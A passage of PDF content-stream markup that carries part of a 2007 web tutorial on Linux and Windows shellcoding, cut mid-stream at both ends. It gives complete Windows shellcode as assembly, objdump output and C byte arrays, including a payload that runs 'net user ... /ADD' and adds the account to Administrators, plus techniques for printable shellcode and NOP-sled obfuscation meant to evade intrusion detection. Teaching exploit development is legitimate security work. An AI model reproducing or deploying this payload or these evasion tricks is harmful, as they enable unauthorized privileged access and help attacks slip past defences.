/TT1 1 Tf
(64)Tj
/TT0 1 Tf
(                      fs)Tj
T*
( 80480ce:       )Tj
/TT1 1 Tf
(6c)Tj
/TT0 1 Tf
(                      insb   \(%dx\),%es:\(%edi\))Tj
T*
( 80480cf:       )Tj
/TT1 1 Tf
(6c)Tj
/TT0 1 Tf
(                      insb   \(%dx\),%es:\(%edi\))Tj
T*
( 80480d0:       )Tj
/TT1 1 Tf
(4e)Tj
/TT0 1 Tf
(                      dec    %esi)Tj
0 -2.4 TD
(080480d1 :)Tj
0 -1.232 TD
( 80480d1:       )Tj
/TT1 1 Tf
(e8 c2 ff ff ff)Tj
/TT0 1 Tf
(          call   8048098 )Tj
T*
( 80480d6:       )Tj
/TT1 1 Tf
(4d)Tj
/TT0 1 Tf
(                      dec    %ebp)Tj
T*
( 80480d7:       )Tj
/TT1 1 Tf
(65)Tj
/TT0 1 Tf
(                      gs)Tj
T*
( 80480d8:       )Tj
/TT1 1 Tf
(73 73)Tj
/TT0 1 Tf
(                   jae    804814d )Tj
T*
( 80480da:       )Tj
/TT1 1 Tf
(61)Tj
/TT0 1 Tf
(                      popa  )Tj
T*
( 80480db:       )Tj
/TT1 1 Tf
(67)Tj
/TT0 1 Tf
(                      addr16)Tj
T*
( 80480dc:       )Tj
/TT1 1 Tf
(65)Tj
/TT0 1 Tf
(                      gs)Tj
T*
( 80480dd:       )Tj
/TT1 1 Tf
(42)Tj
/TT0 1 Tf
(                      inc    %edx)Tj
T*
( 80480de:       )Tj
/TT1 1 Tf
(6f)Tj
/TT0 1 Tf
(                      outsl  %ds:\(%esi\),\(%dx\))Tj
T*
( 80480df:       )Tj
/TT1 1 Tf
(78 41)Tj
/TT0 1 Tf
(                   js     8048122 )Tj
T*
( 80480e1:       )Tj
/TT1 1 Tf
(4e)Tj
/TT0 1 Tf
(                      dec    %esi)Tj
ET
EMC 
/Artifact <</Attached [/Bottom ]/Type /Pagination /BBox [18 6.4959 582 14 ]>>BDC 
Q
BT
/T1_0 1 Tf
7.5041 0 0 7.5041 18 8.3052 Tm
(http://vividmachines.com/shellcode/shellcode.html \(13 of 21\)3/27/2007 \7:53:51 AM)Tj
ET
EMC 

endstreamendobj159 0 obj<</Length 3777>>stream
/Artifact <</Attached [/Top ]/Type /Pagination /BBox [18 779.4959 582 787 ]>>BDC 
0 0 0 rg
0 i 
BT
/T1_0 1 Tf
0 Tc 0 Tw 0  Ts 100  Tz 0 Tr 7.5041 0 0 7.5041 18 781.3052 Tm
(Shellcoding for Linux and Windows Tutorial)Tj
ET
EMC 
/Article <</MCID 0 >>BDC 
q
0 18 612 756 re
W* n
BT
/TT0 1 Tf
11.673 0 0 11.673 8.3379 759.1558 Tm
(080480e2 :)Tj
0 -1.232 TD
( 80480e2:       )Tj
/TT1 1 Tf
(e8 c2 ff ff ff)Tj
/TT0 1 Tf
(          call   80480a9 )Tj
T*
( 80480e7:       )Tj
/TT1 1 Tf
(48)Tj
/TT0 1 Tf
(                      dec    %eax)Tj
0 -1.232 TD
( 80480e8:       )Tj
/TT1 1 Tf
(65)Tj
/TT0 1 Tf
(                      gs)Tj
0 -1.232 TD
( 80480e9:       )Tj
/TT1 1 Tf
(79 4e)Tj
/TT0 1 Tf
(                   jns    8048139 )Tj
0 -1.2 TD
( )Tj
0 -2.557 TD
(Replace the code at the top with:)Tj
/TT1 1 Tf
0 -1.232 TD
(char code[] =   "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\xeb\\x37\\x59\\\x88\\x51\\x0a\\xbb\\x61)Tj
0 -1.2 TD
(\\xd9"\\)Tj
T*
(                "\\xe7\\x77\\x51\\xff\\xd3\\xeb\\x39\\x59\\x31\\xd2\\x88\\\x51\\x0b\\x51\\x50\\xbb)Tj
T*
(\\x32"\\)Tj
T*
(                "\\xb3\\xe7\\x77\\xff\\xd3\\xeb\\x39\\x59\\x31\\xd2\\x88\\\x51\\x03\\x31\\xd2\\x52)Tj
T*
(\\x51"\\)Tj
0 -1.2 TD
(                "\\x51\\x52\\xff\\xd0\\x31\\xd2\\x50\\xb8\\xfd\\x98\\xe7\\\x77\\xff\\xd0\\xe8\\xc4)Tj
0 -1.2 TD
(\\xff"\\)Tj
T*
(                "\\xff\\xff\\x75\\x73\\x65\\x72\\x33\\x32\\x2e\\x64\\x6c\\\x6c\\x4e\\xe8\\xc2\\xff)Tj
T*
(\\xff"\\)Tj
T*
(                "\\xff\\x4d\\x65\\x73\\x73\\x61\\x67\\x65\\x42\\x6f\\x78\\\x41\\x4e\\xe8\\xc2\\xff)Tj
T*
(\\xff"\\)Tj
T*
(                "\\xff\\x48\\x65\\x79\\x4e";)Tj
/TT0 1 Tf
0 -3.725 TD
(This example, while not useful in the fact that it only pops up a messag\e box, )Tj
0 -1.2 TD
(illustrates several important concepts when using windows shellcoding. S\tatic )Tj
T*
(addressing as used in most of the example above can be a powerful \(and \easy\) way to )Tj
T*
(whip up working shellcode within minutes. This example shows the process\ of ensuring )Tj
T*
(that certain DLLs are loaded into a process space. Once the address of t\he )Tj
0 -1.2 TD
(MessageBoxA function is obtained ExitProcess is called to make sure that\ the program )Tj
T*
(ends without crashing.)Tj
/T1_0 1 Tf
0 -2.716 TD
( )Tj
/TT1 1 Tf
0 -2.431 TD
(Example 3 - Adding an Administrative Account)Tj
/TT0 1 Tf
0 -2.525 TD
(    This third example is actually quite a bit simpler than the previous\ shellcode, )Tj
0 -1.2 TD
(but this code allows the exploiter to add a user to the remote system an\d give that )Tj
T*
(user administrative privileges. This code does not require the loading o\f extra )Tj
T*
(libraries into the process space because the only functions we will be u\sing are )Tj
T*
(WinExec and ExitProcess. Note: the idea for this code was taken from the\ Metasploit )Tj
T*
(project mentioned above. The difference between the shellcode is that th\is code is )Tj
T*
(quite a bit smaller than its counterpart, and it can be made even smalle\r by )Tj
T*
(removing the ExitProcess function!)Tj
0 -2.589 TD
(G:\\>)Tj
/TT1 1 Tf
(arwin kernel32.dll ExitProcess)Tj
/TT0 1 Tf
0 -1.2 TD
(arwin - win32 address resolution program - by steve hanna - v.01)Tj
0 -1.232 TD
(ExitProcess is located at )Tj
/TT1 1 Tf
(0x77e798fd)Tj
/TT0 1 Tf
( in kernel32.dll)Tj
0 -2.432 TD
(G:\\>)Tj
/TT1 1 Tf
(arwin kernel32.dll WinExec)Tj
/TT0 1 Tf
0 -1.2 TD
(arwin - win32 address resolution program - by steve hanna - v.01)Tj
0 -1.232 TD
(WinExec is located at )Tj
/TT1 1 Tf
(0x77e6fd35)Tj
/TT0 1 Tf
( in kernel32.dll)Tj
ET
EMC 
/Artifact <</Attached [/Bottom ]/Type /Pagination /BBox [18 6.4959 582 14 ]>>BDC 
Q
BT
/T1_0 1 Tf
7.5041 0 0 7.5041 18 8.3052 Tm
(http://vividmachines.com/shellcode/shellcode.html \(14 of 21\)3/27/2007 \7:53:51 AM)Tj
ET
EMC 

endstreamendobj160 0 obj<</Length 2628>>stream
/Artifact <</Attached [/Top ]/Type /Pagination /BBox [18 779.4959 582 787 ]>>BDC 
0 0 0 rg
0 i 
BT
/T1_0 1 Tf
0 Tc 0 Tw 0  Ts 100  Tz 0 Tr 7.5041 0 0 7.5041 18 781.3052 Tm
(Shellcoding for Linux and Windows Tutorial)Tj
ET
EMC 
/Article <</MCID 0 >>BDC 
q
0 18 612 756 re
W* n
0.5 0.5 0.5 rg
8.338 729.976 m
8.338 731.644 l
603.662 731.644 l
602.828 730.81 l
9.172 730.81 l
9.172 730.81 l
h
f
0.875 0.875 0.875 rg
603.662 731.644 m
603.662 729.976 l
8.338 729.976 l
9.172 730.81 l
602.828 730.81 l
602.828 730.81 l
h
f
0 0 0 rg
BT
/TT0 1 Tf
11.673 0 0 11.673 8.3379 697.9677 Tm
(;)Tj
/TT1 1 Tf
(adduser.asm)Tj
/TT0 1 Tf
0 -1.2 TD
([Section .text])Tj
0 -2.4 TD
(global _start)Tj
0 -2.4 TD
(_start:)Tj
T*
(jmp short GetCommand)Tj
T*
(CommandReturn:)Tj
0 -1.2 TD
(         pop ebx                ;ebx now holds the handle to the string)Tj
T*
(         xor eax,eax)Tj
T*
(         push eax)Tj
T*
(         xor eax,eax            ;for some reason the registers can be ve\ry volatile, )Tj
T*
(did this just in case)Tj
T*
(         mov [ebx + 89],al      ;insert the NULL character)Tj
T*
(         push ebx)Tj
T*
(         mov ebx,0x77e6fd35)Tj
T*
(         call ebx               ;call WinExec\(path,showcode\))Tj
0 -2.4 TD
(         xor eax,eax            ;zero the register again, clears winexec\ retval)Tj
0 -1.2 TD
(         push eax)Tj
T*
(         mov ebx, 0x77e798fd)Tj
T*
(         call ebx               ;call ExitProcess\(0\);)Tj
0 -3.6 TD
(GetCommand:)Tj
0 -1.2 TD
(        ;the N at the end of the db will be replaced with a null charact\er)Tj
0 -1.2 TD
(        call CommandReturn)Tj
T*
(        db "cmd.exe /c net user USERNAME PASSWORD /ADD && net localgroup\ )Tj
T*
(Administrators /ADD USERNAMEN")Tj
0 -3.789 TD
(steve hanna@1337b0x:~$ )Tj
/TT2 1 Tf
(nasm -f elf adduser.asm; ld -o adduser adduser.o; objdump -d )Tj
0 -1.232 TD
(adduser)Tj
/TT0 1 Tf
0 -2.368 TD
(adduser:     file format elf32-i386)Tj
0 -2.4 TD
(Disassembly of section .text:)Tj
T*
(08048080 <_start>:)Tj
0 -1.232 TD
( 8048080:       )Tj
/TT2 1 Tf
(eb 1b)Tj
/TT0 1 Tf
(                   jmp    804809d )Tj
0 -2.4 TD
(08048082 :)Tj
0 -1.232 TD
( 8048082:       )Tj
/TT2 1 Tf
(5b)Tj
/TT0 1 Tf
(                      pop    %ebx)Tj
T*
( 8048083:       )Tj
/TT2 1 Tf
(31 c0)Tj
/TT0 1 Tf
(                   xor    %eax,%eax)Tj
T*
( 8048085:       )Tj
/TT2 1 Tf
(50)Tj
/TT0 1 Tf
(                      push   %eax)Tj
ET
EMC 
/Artifact <</Attached [/Bottom ]/Type /Pagination /BBox [18 6.4959 582 14 ]>>BDC 
Q
BT
/T1_0 1 Tf
7.5041 0 0 7.5041 18 8.3052 Tm
(http://vividmachines.com/shellcode/shellcode.html \(15 of 21\)3/27/2007 \7:53:51 AM)Tj
ET
EMC 

endstreamendobj161 0 obj<</Length 5167>>stream
/Artifact <</Attached [/Top ]/Type /Pagination /BBox [18 779.4959 582 787 ]>>BDC 
0 0 0 rg
0 i 
BT
/T1_0 1 Tf
0 Tc 0 Tw 0  Ts 100  Tz 0 Tr 7.5041 0 0 7.5041 18 781.3052 Tm
(Shellcoding for Linux and Windows Tutorial)Tj
ET
EMC 
/Article <</MCID 0 >>BDC 
q
0 18 612 756 re
W* n
BT
/TT0 1 Tf
11.673 0 0 11.673 8.3379 758.7814 Tm
( 8048086:       )Tj
/TT1 1 Tf
(31 c0)Tj
/TT0 1 Tf
(                   xor    %eax,%eax)Tj
0 -1.232 TD
( 8048088:       )Tj
/TT1 1 Tf
(88 43 59)Tj
/TT0 1 Tf
(                mov    %al,0x59\(%ebx\))Tj
T*
( 804808b:       )Tj
/TT1 1 Tf
(53)Tj
/TT0 1 Tf
(                      push   %ebx)Tj
0 -1.232 TD
( 804808c:       )Tj
/TT1 1 Tf
(bb 35 fd e6 77)Tj
/TT0 1 Tf
(          mov    $0x77e6fd35,%ebx)Tj
0 -1.232 TD
( 8048091:       )Tj
/TT1 1 Tf
(ff d3)Tj
/TT0 1 Tf
(                   call   *%ebx)Tj
T*
( 8048093:       )Tj
/TT1 1 Tf
(31 c0)Tj
/TT0 1 Tf
(                   xor    %eax,%eax)Tj
T*
( 8048095:       )Tj
/TT1 1 Tf
(50)Tj
/TT0 1 Tf
(                      push   %eax)Tj
T*
( 8048096:       )Tj
/TT1 1 Tf
(bb fd 98 e7 77)Tj
/TT0 1 Tf
(          mov    $0x77e798fd,%ebx)Tj
0 -1.232 TD
( 804809b:       )Tj
/TT1 1 Tf
(ff d3)Tj
/TT0 1 Tf
(                   call   *%ebx)Tj
0 -2.4 TD
(0804809d :)Tj
0 -1.232 TD
( 804809d:       )Tj
/TT1 1 Tf
(e8 e0 ff ff ff)Tj
/TT0 1 Tf
(          call   8048082 )Tj
T*
( 80480a2:       )Tj
/TT1 1 Tf
(63 6d 64)Tj
/TT0 1 Tf
(                arpl   %bp,0x64\(%ebp\))Tj
T*
( 80480a5:       )Tj
/TT1 1 Tf
(2e)Tj
/TT0 1 Tf
(                      cs)Tj
T*
( 80480a6:       )Tj
/TT1 1 Tf
(65)Tj
/TT0 1 Tf
(                      gs)Tj
T*
( 80480a7:       )Tj
/TT1 1 Tf
(78 65)Tj
/TT0 1 Tf
(                   js     804810e )Tj
T*
( 80480a9:       )Tj
/TT1 1 Tf
(20 2f)Tj
/TT0 1 Tf
(                   and    %ch,\(%edi\))Tj
T*
( 80480ab:       )Tj
/TT1 1 Tf
(63 20)Tj
/TT0 1 Tf
(                   arpl   %sp,\(%eax\))Tj
T*
( 80480ad:       )Tj
/TT1 1 Tf
(6e)Tj
/TT0 1 Tf
(                      outsb  %ds:\(%esi\),\(%dx\))Tj
T*
( 80480ae:       )Tj
/TT1 1 Tf
(65)Tj
/TT0 1 Tf
(                      gs)Tj
T*
( 80480af:       )Tj
/TT1 1 Tf
(74 20)Tj
/TT0 1 Tf
(                   je     80480d1 )Tj
T*
( 80480b1:       )Tj
/TT1 1 Tf
(75 73)Tj
/TT0 1 Tf
(                   jne    8048126 )Tj
T*
( 80480b3:       )Tj
/TT1 1 Tf
(65)Tj
/TT0 1 Tf
(                      gs)Tj
T*
( 80480b4:       )Tj
/TT1 1 Tf
(72 20)Tj
/TT0 1 Tf
(                   jb     80480d6 )Tj
T*
( 80480b6:       )Tj
/TT1 1 Tf
(55)Tj
/TT0 1 Tf
(                      push   %ebp)Tj
T*
( 80480b7:       )Tj
/TT1 1 Tf
(53)Tj
/TT0 1 Tf
(                      push   %ebx)Tj
T*
( 80480b8:       )Tj
/TT1 1 Tf
(45)Tj
/TT0 1 Tf
(                      inc    %ebp)Tj
T*
( 80480b9:       )Tj
/TT1 1 Tf
(52)Tj
/TT0 1 Tf
(                      push   %edx)Tj
T*
( 80480ba:       )Tj
/TT1 1 Tf
(4e)Tj
/TT0 1 Tf
(                      dec    %esi)Tj
T*
( 80480bb:       )Tj
/TT1 1 Tf
(41)Tj
/TT0 1 Tf
(                      inc    %ecx)Tj
T*
( 80480bc:       )Tj
/TT1 1 Tf
(4d)Tj
/TT0 1 Tf
(                      dec    %ebp)Tj
T*
( 80480bd:       )Tj
/TT1 1 Tf
(45)Tj
/TT0 1 Tf
(                      inc    %ebp)Tj
T*
( 80480be:       )Tj
/TT1 1 Tf
(20 50 41)Tj
/TT0 1 Tf
(                and    %dl,0x41\(%eax\))Tj
T*
( 80480c1:       )Tj
/TT1 1 Tf
(53)Tj
/TT0 1 Tf
(                      push   %ebx)Tj
T*
( 80480c2:       )Tj
/TT1 1 Tf
(53)Tj
/TT0 1 Tf
(                      push   %ebx)Tj
T*
( 80480c3:       )Tj
/TT1 1 Tf
(57)Tj
/TT0 1 Tf
(                      push   %edi)Tj
T*
( 80480c4:       )Tj
/TT1 1 Tf
(4f)Tj
/TT0 1 Tf
(                      dec    %edi)Tj
T*
( 80480c5:       )Tj
/TT1 1 Tf
(52)Tj
/TT0 1 Tf
(                      push   %edx)Tj
T*
( 80480c6:       )Tj
/TT1 1 Tf
(44)Tj
/TT0 1 Tf
(                      inc    %esp)Tj
T*
( 80480c7:       )Tj
/TT1 1 Tf
(20 2f)Tj
/TT0 1 Tf
(                   and    %ch,\(%edi\))Tj
T*
( 80480c9:       )Tj
/TT1 1 Tf
(41)Tj
/TT0 1 Tf
(                      inc    %ecx)Tj
T*
( 80480ca:       )Tj
/TT1 1 Tf
(44)Tj
/TT0 1 Tf
(                      inc    %esp)Tj
T*
( 80480cb:       )Tj
/TT1 1 Tf
(44)Tj
/TT0 1 Tf
(                      inc    %esp)Tj
T*
( 80480cc:       )Tj
/TT1 1 Tf
(20 26)Tj
/TT0 1 Tf
(                   and    %ah,\(%esi\))Tj
T*
( 80480ce:       )Tj
/TT1 1 Tf
(26 20 6e 65)Tj
/TT0 1 Tf
(             and    %ch,%es:0x65\(%esi\))Tj
T*
( 80480d2:       )Tj
/TT1 1 Tf
(74 20)Tj
/TT0 1 Tf
(                   je     80480f4 )Tj
T*
( 80480d4:       )Tj
/TT1 1 Tf
(6c)Tj
/TT0 1 Tf
(                      insb   \(%dx\),%es:\(%edi\))Tj
T*
( 80480d5:       )Tj
/TT1 1 Tf
(6f)Tj
/TT0 1 Tf
(                      outsl  %ds:\(%esi\),\(%dx\))Tj
T*
( 80480d6:       )Tj
/TT1 1 Tf
(63 61 6c)Tj
/TT0 1 Tf
(                arpl   %sp,0x6c\(%ecx\))Tj
T*
( 80480d9:       )Tj
/TT1 1 Tf
(67 72 6f)Tj
/TT0 1 Tf
(                addr16 jb 804814b )Tj
T*
( 80480dc:       )Tj
/TT1 1 Tf
(75 70)Tj
/TT0 1 Tf
(                   jne    804814e )Tj
ET
EMC 
/Artifact <</Attached [/Bottom ]/Type /Pagination /BBox [18 6.4959 582 14 ]>>BDC 
Q
BT
/T1_0 1 Tf
7.5041 0 0 7.5041 18 8.3052 Tm
(http://vividmachines.com/shellcode/shellcode.html \(16 of 21\)3/27/2007 \7:53:51 AM)Tj
ET
EMC 

endstreamendobj162 0 obj<</Length 4254>>stream
/Artifact <</Attached [/Top ]/Type /Pagination /BBox [18 779.4959 582 787 ]>>BDC 
0 0 0 rg
0 i 
BT
/T1_0 1 Tf
0 Tc 0 Tw 0  Ts 100  Tz 0 Tr 7.5041 0 0 7.5041 18 781.3052 Tm
(Shellcoding for Linux and Windows Tutorial)Tj
ET
EMC 
/Article <</MCID 0 >>BDC 
q
0 18 612 756 re
W* n
BT
/TT0 1 Tf
11.673 0 0 11.673 8.3379 758.7814 Tm
( 80480de:       )Tj
/TT1 1 Tf
(20 41 64)Tj
/TT0 1 Tf
(                and    %al,0x64\(%ecx\))Tj
0 -1.232 TD
( 80480e1:       )Tj
/TT1 1 Tf
(6d)Tj
/TT0 1 Tf
(                      insl   \(%dx\),%es:\(%edi\))Tj
T*
( 80480e2:       )Tj
/TT1 1 Tf
(69 6e 69 73 74 72 61)Tj
/TT0 1 Tf
(    imul   $0x61727473,0x69\(%esi\),%ebp)Tj
0 -1.232 TD
( 80480e9:       )Tj
/TT1 1 Tf
(74 6f)Tj
/TT0 1 Tf
(                   je     804815a )Tj
0 -1.232 TD
( 80480eb:       )Tj
/TT1 1 Tf
(72 73)Tj
/TT0 1 Tf
(                   jb     8048160 )Tj
T*
( 80480ed:       )Tj
/TT1 1 Tf
(20 2f)Tj
/TT0 1 Tf
(                   and    %ch,\(%edi\))Tj
T*
( 80480ef:       )Tj
/TT1 1 Tf
(41 )Tj
/TT0 1 Tf
(                     inc    %ecx)Tj
T*
( 80480f0:       )Tj
/TT1 1 Tf
(44)Tj
/TT0 1 Tf
(                      inc    %esp)Tj
0 -1.232 TD
( 80480f1:       )Tj
/TT1 1 Tf
(44)Tj
/TT0 1 Tf
(                      inc    %esp)Tj
T*
( 80480f2:       )Tj
/TT1 1 Tf
(20 55 53)Tj
/TT0 1 Tf
(                and    %dl,0x53\(%ebp\))Tj
T*
( 80480f5:       )Tj
/TT1 1 Tf
(45)Tj
/TT0 1 Tf
(                      inc    %ebp)Tj
T*
( 80480f6:       )Tj
/TT1 1 Tf
(52)Tj
/TT0 1 Tf
(                      push   %edx)Tj
T*
( 80480f7:       )Tj
/TT1 1 Tf
(4e)Tj
/TT0 1 Tf
(                      dec    %esi)Tj
0 -1.232 TD
( 80480f8:       )Tj
/TT1 1 Tf
(41)Tj
/TT0 1 Tf
(                      inc    %ecx)Tj
0 -1.232 TD
( 80480f9:       )Tj
/TT1 1 Tf
(4d)Tj
/TT0 1 Tf
(                      dec    %ebp)Tj
T*
( 80480fa:       )Tj
/TT1 1 Tf
(45)Tj
/TT0 1 Tf
(                      inc    %ebp)Tj
T*
( 80480fb:       )Tj
/TT1 1 Tf
(4e)Tj
/TT0 1 Tf
(                      dec    %esi)Tj
ET
0.5 0.5 0.5 rg
8.338 485.48 m
8.338 487.148 l
603.662 487.148 l
602.828 486.314 l
9.172 486.314 l
9.172 486.314 l
h
f
0.875 0.875 0.875 rg
603.662 487.148 m
603.662 485.48 l
8.338 485.48 l
9.172 486.314 l
602.828 486.314 l
602.828 486.314 l
h
f
0 0 0 rg
BT
/TT0 1 Tf
11.673 0 0 11.673 8.3379 455.628 Tm
(Replace the code at the top with: )Tj
0 -2.432 TD
( )Tj
/TT1 1 Tf
(char code[] =  "\\xeb\\x1b\\x5b\\x31\\xc0\\x50\\x31\\xc0\\x88\\x43\\x59\\\x53\\xbb\\x35\\xfd\\xe6)Tj
0 -1.232 TD
(\\x77"\\)Tj
0 -1.2 TD
(                "\\xff\\xd3\\x31\\xc0\\x50\\xbb\\xfd\\x98\\xe7\\x77\\xff\\\xd3\\xe8\\xe0\\xff\\xff)Tj
T*
(\\xff"\\)Tj
T*
(                "\\x63\\x6d\\x64\\x2e\\x65\\x78\\x65\\x20\\x2f\\x63\\x20\\\x6e\\x65\\x74\\x20\\x75)Tj
T*
(\\x73"\\)Tj
0 -1.2 TD
(                "\\x65\\x72\\x20\\x55\\x53\\x45\\x52\\x4e\\x41\\x4d\\x45\\\x20\\x50\\x41\\x53\\x53)Tj
T*
(\\x57"\\)Tj
T*
(                "\\x4f\\x52\\x44\\x20\\x2f\\x41\\x44\\x44\\x20\\x26\\x26\\\x20\\x6e\\x65\\x74\\x20)Tj
T*
(\\x6c"\\)Tj
T*
(                "\\x6f\\x63\\x61\\x6c\\x67\\x72\\x6f\\x75\\x70\\x20\\x41\\\x64\\x6d\\x69\\x6e\\x69)Tj
T*
(\\x73"\\)Tj
0 -1.2 TD
(                "\\x74\\x72\\x61\\x74\\x6f\\x72\\x73\\x20\\x2f\\x41\\x44\\\x44\\x20\\x55\\x53\\x45)Tj
0 -1.2 TD
(\\x52"\\)Tj
T*
(                "\\x4e\\x41\\x4d\\x45\\x4e";)Tj
/TT0 1 Tf
0 -2.525 TD
(When this code is executed it will add a user to the system with the spe\cified )Tj
0 -1.2 TD
(password, then adds that user to the local Administrators group. After t\hat code is )Tj
0 -1.359 TD
(done executing, the parent process is exited by calling ExitProcess.)Tj
/T1_0 1 Tf
( )Tj
0 -2.716 TD
( )Tj
/TT1 1 Tf
16.1626 0 0 16.1626 8.3379 108.0532 Tm
(Advanced Shellcoding)Tj
/TT0 1 Tf
11.673 0 0 11.673 8.3379 76.4784 Tm
(    This section covers some more advanced topics in shellcoding. Over t\ime I hope )Tj
0 -1.2 TD
(to add quite a bit more content here but for the time being I am very bu\sy. If you )Tj
T*
(have any specific requests for topics in this section, please do not hes\itate to )Tj
ET
EMC 
/Artifact <</Attached [/Bottom ]/Type /Pagination /BBox [18 6.4959 582 14 ]>>BDC 
Q
BT
/T1_0 1 Tf
7.5041 0 0 7.5041 18 8.3052 Tm
(http://vividmachines.com/shellcode/shellcode.html \(17 of 21\)3/27/2007 \7:53:51 AM)Tj
ET
EMC 

endstreamendobj163 0 obj<</Length 4347>>stream
/Artifact <</Attached [/Top ]/Type /Pagination /BBox [18 779.4959 582 787 ]>>BDC 
0 0 0 rg
0 i 
BT
/T1_0 1 Tf
0 Tc 0 Tw 0  Ts 100  Tz 0 Tr 7.5041 0 0 7.5041 18 781.3052 Tm
(Shellcoding for Linux and Windows Tutorial)Tj
ET
EMC 
/Article <</MCID 0 >>BDC 
q
0 18 612 756 re
W* n
BT
/TT0 1 Tf
11.673 0 0 11.673 8.3379 759.1558 Tm
(email me. )Tj
/TT1 1 Tf
0 -2.589 TD
(Printable Shellcode)Tj
/TT0 1 Tf
0 -2.525 TD
(   The basis for this section is the fact that many Intrustion Detection\ Systems )Tj
0 -1.2 TD
(detect shellcode because of the non-printable characters that are common\ to all )Tj
T*
(binary data. The IDS observes that a packet containts some binary data \(\with for )Tj
T*
(instance a NOP sled within this binary data\) and as a result may drop t\he packet. In )Tj
0 -1.2 TD
(addition to this, many programs filter input unless it is alpha-numeric.\ The )Tj
T*
(motivation behind printable alpha-numeric shellcode should be quite obvi\ous. By )Tj
T*
(increasing the size of our shellcode we can implement a method in which \our entire )Tj
T*
(shellcode block in in printable characters. This section will differ a b\it from the )Tj
T*
(others presented in this paper. This section will simply demonstrate the\ tactic with )Tj
T*
(small examples without an all encompassing final example. )Tj
0 -2.557 TD
(   Our first discussion starts with obfuscating the ever blatant NOP sle\d. When an )Tj
0 -1.2 TD
(IDS sees an arbitrarily long string of NOPs \(0x90\) it will most likely\ drop the )Tj
T*
(packet. To get around this we observe the decrement and increment op cod\es: )Tj
ET
0.5 0.5 0.5 rg
8.338 486.343 m
8.338 488.011 l
603.662 488.011 l
602.828 487.177 l
9.172 487.177 l
9.172 487.177 l
h
f
0.875 0.875 0.875 rg
603.662 488.011 m
603.662 486.343 l
8.338 486.343 l
9.172 487.177 l
602.828 487.177 l
602.828 487.177 l
h
f
0 0 0 rg
BT
/TT0 1 Tf
11.673 0 0 11.673 8.3379 455.0112 Tm
(        )Tj
/TT2 1 Tf
(OP Code        Hex       ASCII)Tj
/TT0 1 Tf
0 -1.232 TD
(        )Tj
/TT1 1 Tf
(inc eax)Tj
/TT0 1 Tf
(        0x40        @)Tj
T*
(        )Tj
/TT1 1 Tf
(inc ebx)Tj
/TT0 1 Tf
(        0x43        C)Tj
0 -1.232 TD
(        )Tj
/TT1 1 Tf
(inc ecx)Tj
/TT0 1 Tf
(        0x41        A)Tj
0 -1.232 TD
(        )Tj
/TT1 1 Tf
(inc edx)Tj
/TT0 1 Tf
(        0x42        B)Tj
T*
(        )Tj
/TT1 1 Tf
(dec eax)Tj
/TT0 1 Tf
(        0x48        H)Tj
T*
(        )Tj
/TT1 1 Tf
(dec ebx)Tj
/TT0 1 Tf
(        0x4B        K)Tj
T*
(        )Tj
/TT1 1 Tf
(dec ecx)Tj
/TT0 1 Tf
(        0x49        I)Tj
0 -1.232 TD
(        )Tj
/TT1 1 Tf
(dec edx)Tj
/TT0 1 Tf
(        0x4A        J)Tj
ET
0.5 0.5 0.5 rg
8.338 310.775 m
8.338 312.442 l
603.662 312.442 l
602.828 311.608 l
9.172 311.608 l
9.172 311.608 l
h
f
0.875 0.875 0.875 rg
603.662 312.442 m
603.662 310.775 l
8.338 310.775 l
9.172 311.608 l
602.828 311.608 l
602.828 311.608 l
h
f
0 0 0 rg
BT
/TT0 1 Tf
11.673 0 0 11.673 8.3379 297.9315 Tm
( )Tj
0 -1 TD
( )Tj
0 -1.1 TD
(It should be pretty obvious that if we insert these operations instead o\f a NOP sled )Tj
0 -1.2 TD
(then the code will not affect the output. This is due to the fact that w\henever we )Tj
0 -1.2 TD
(use a register in our shellcode we wither move a value into it or we xor\ it. )Tj
T*
(Incrementing or decrementing the register before our code executes will \not change )Tj
T*
(the desired operation. )Tj
0 -2.557 TD
(So, the next portion of this printable shellcode section will discuss a \method for )Tj
0 -1.2 TD
(making one's entire block of shellcode alpha-numeric-- by means of some \major )Tj
T*
(tomfoolery. We must first discuss the few opcodes that fall in the print\able ascii )Tj
T*
(range \(0x33 through 0x7e\). )Tj
ET
0.5 0.5 0.5 rg
8.338 116.335 m
8.338 118.003 l
603.662 118.003 l
602.828 117.169 l
9.172 117.169 l
9.172 117.169 l
h
f
0.875 0.875 0.875 rg
603.662 118.003 m
603.662 116.335 l
8.338 116.335 l
9.172 117.169 l
602.828 117.169 l
602.828 117.169 l
h
f
0 0 0 rg
BT
/T1_1 1 Tf
11.673 0 0 11.673 8.3379 84.5748 Tm
(        sub eax, 0xHEXINRANGE)Tj
0 -1.2 TD
(        push eax)Tj
T*
(        pop eax)Tj
0 -1.2 TD
(        push esp)Tj
ET
EMC 
/Artifact <</Attached [/Bottom ]/Type /Pagination /BBox [18 6.4959 582 14 ]>>BDC 
Q
BT
/T1_0 1 Tf
7.5041 0 0 7.5041 18 8.3052 Tm
(http://vividmachines.com/shellcode/shellcode.html \(18 of 21\)3/27/2007 \7:53:51 AM)Tj
ET
EMC 

endstreamendobj164 0 obj<</Length 4078>>stream
/Artifact <</Attached [/Top ]/Type /Pagination /BBox [18 779.4959 582 787 ]>>BDC 
0 0 0 rg
0 i 
BT
/T1_0 1 Tf
0 Tc 0 Tw 0  Ts 100  Tz 0 Tr 7.5041 0 0 7.5041 18 781.3052 Tm
(Shellcoding for Linux and Windows Tutorial)Tj
ET
EMC 
/Article <</MCID 0 >>BDC 
q
0 18 612 756 re
W* n
BT
/T1_1 1 Tf
11.673 0 0 11.673 8.3379 757.2477 Tm
(        pop esp)Tj
0 -1.2 TD
(        and eax, 0xHEXINRANGE)Tj
0 -1.1 TD
(        )Tj
ET
0.5 0.5 0.5 rg
8.338 704.295 m
8.338 705.963 l
603.662 705.963 l
602.828 705.129 l
9.172 705.129 l
9.172 705.129 l
h
f
0.875 0.875 0.875 rg
603.662 705.963 m
603.662 704.295 l
8.338 704.295 l
9.172 705.129 l
602.828 705.129 l
602.828 705.129 l
h
f
0 0 0 rg
BT
/TT0 1 Tf
11.673 0 0 11.673 8.3379 674.443 Tm
(Surprisingly, we can actually do whatever we want with these instruction\s. I did my )Tj
0 -1.2 TD
(best to keep diagrams out of this talk, but I decided to grace the world\ with my )Tj
T*
(wonderful ASCII art. Below you can find a diagram of the basic plan for \constructing )Tj
0 -1.2 TD
(the shellcode. )Tj
/T1_1 1 Tf
0 -2.721 TD
(        The plan works as follows:)Tj
0 -1.2 TD
(                -make space on stack for shellcode and loader)Tj
T*
(                -execute loader code to construct shellcode)Tj
0 -1.2 TD
